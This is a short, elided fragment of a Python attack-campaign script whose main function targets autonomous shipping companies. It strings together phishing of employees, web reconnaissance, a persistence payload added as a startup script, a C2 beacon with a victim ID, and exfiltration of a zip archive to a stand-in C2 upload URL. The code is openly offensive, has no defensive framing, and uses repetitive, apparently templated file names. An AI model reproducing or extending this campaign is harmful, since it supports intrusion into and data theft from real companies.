...
def main():
    """
    Main function to run the autonomous_shipping_campaign campaign.
    """
    print(f"[*] Starting autonomous_shipping_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("autonomous_shipping_companies_employees.txt")
    run_tool("apt_web_recon.js", "--target autonomous_shipping_companies.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/autonomous_shipping_technology_and_hijacking_ships_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-AUTONOMOUS_SHIPPING_COMPANIES-01")
    ...
    exfiltration.exfiltrate_data("autonomous_shipping_technology_and_hijacking_ships/autonomous_shipping_technology_and_hijacking_ships.zip", "https://c2.example.com/upload")
    run_tool("payloads/autonomous_shipping_technology_and_hijacking_ships_exfiltrator.py")
